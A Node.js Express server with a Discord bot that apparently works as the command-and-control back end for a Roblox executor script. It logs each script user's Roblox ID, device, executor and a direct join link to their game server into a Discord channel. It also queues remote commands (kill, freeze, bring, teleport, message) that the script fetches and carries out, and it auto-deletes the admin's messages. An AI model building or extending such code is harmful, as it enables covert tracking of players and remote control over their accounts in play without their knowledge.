const express = require("express");
const fs = require("fs");
const { Client, GatewayIntentBits } = require("discord.js");

const app = express();
app.use(express.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CANAL_DESTINO = process.env.CANAL_DESTINO;
const ADMIN_ID = process.env.ADMIN_ID;

let db = { users: [] };
let commands = [];
let activeUsers = {};

function saveDB() {
    fs.writeFileSync("db.json", JSON.stringify(db, null, 2));
}

if (fs.existsSync("db.json")) {
    db = JSON.parse(fs.readFileSync("db.json"));
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once("ready", () => {
    console.log("Bot iniciado!");
});

client.on("messageCreate", async (msg) => {
    if (msg.author.bot) return;
    if (msg.author.id !== ADMIN_ID) return;
    if (!msg.content.startsWith(".")) return;

    const args = msg.content.split(" ");
    const cmd = args[0].substring(1).toLowerCase();
    const targetUser = args[1]?.toLowerCase();
    const arg2 = args[2];
    const arg3 = args[3];
    const content = args.slice(2).join(" ");

    if (cmd === "cmds") {
        const cmdsList = [
            ".kill",
            ".speed <v>",
            ".freeze",
            ".unfreeze",
            ".bring <user1> <user2>",
            ".teleport <user>",
            ".message <user> <content>",
            ".rejoin",
            ".rn"
        ].join("\n");
        const botMsg = await msg.channel.send("**Comandos disponíveis:**\n" + cmdsList);
        setTimeout(() => {
            msg.delete().catch(() => {});
            botMsg.delete().catch(() => {});
        }, 5000);
        return;
    }

    if (cmd === "rn") {
        const activeList = Object.entries(activeUsers).map(([id,name],i) => `${i+1}. ${name}`).join("\n") || "Nenhum usuário ativo";
        const botMsg = await msg.channel.send("**Usuários ativos:**\n" + activeList);
        setTimeout(() => {
            msg.delete().catch(() => {});
            botMsg.delete().catch(() => {});
        }, 5000);
        return;
    }

    if (!targetUser) return msg.reply("Use: .comando username argumentos").then(m => setTimeout(() => m.delete().catch(() => {}),5000));

    commands.push({
        user: targetUser,
        command: cmd,
        arg1: arg2,
        arg2: arg3,
        content: cmd === "message" ? content : null
    });

    const botMsg = await msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
    setTimeout(() => {
        msg.delete().catch(() => {});
        botMsg.delete().catch(() => {});
    }, 5000);
});

app.post("/nextCommand", (req, res) => {
    const username = req.body.username?.toLowerCase();
    if (!username) return res.json({ command: null });

    const found = commands.find(c => c.user === username);
    if (found) {
        commands = commands.filter(c => c !== found);
        activeUsers[req.body.username] = req.body.username;
        return res.json(found);
    }

    return res.json({ command: null });
});

app.post("/log", async (req, res) => {
    const { userId, username, executor, device, date, time, placeId, serverJobId } = req.body;
    if (!userId || !username) return res.status(400).send("Requisição inválida.");

    activeUsers[username] = username;

    if (!db.users.includes(userId)) {
        db.users.push(userId);
        saveDB();
        const channel = await client.channels.fetch(CANAL_DESTINO);
        const msg = `📌 **USUÁRIO NOVO**
**Usuário:** [${username}](https://www.roblox.com/users/${userId}/profile)
**Executor:** ${executor}
**Dispositivo:** ${device}
**Data:** ${date}
**Hora:** ${time}
**Entrar no servidor:** https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId}`;
        channel.send(msg);
    }

    res.send("OK");
});

app.post("/removeUser", (req,res) => {
    const username = req.body.username;
    if(username) delete activeUsers[username];
    res.send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Servidor rodando na porta " + PORT));
client.login(BOT_TOKEN);
